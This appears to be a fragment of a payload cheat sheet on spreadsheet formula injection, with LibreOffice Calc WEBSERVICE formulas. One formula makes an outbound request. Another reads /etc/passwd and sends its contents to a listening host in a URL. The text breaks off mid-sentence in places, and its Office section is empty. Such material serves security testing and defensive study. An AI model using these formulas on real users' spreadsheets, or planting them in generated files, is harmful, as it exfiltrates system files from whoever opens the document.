


## Payloads



## Libreoffice / Linux

In order to make a simple request through libreoffice Calc you can do this in a cell:

```
=WEBSERVICE("http://labburk.se")
```
To get this to execute on Libreoffice > 6 is quite a hassle. First the user mst open the document and allow importing passwd file. Then the user must 

```
=WEBSERVICE(CONCATENATE("http://localhost:8888/?AA", ('file:///etc/passwd'#$passwd.A1)))
```

Documented here:
https://www.notsosecure.com/data-exfiltration-formula-injection/

You can



## Office
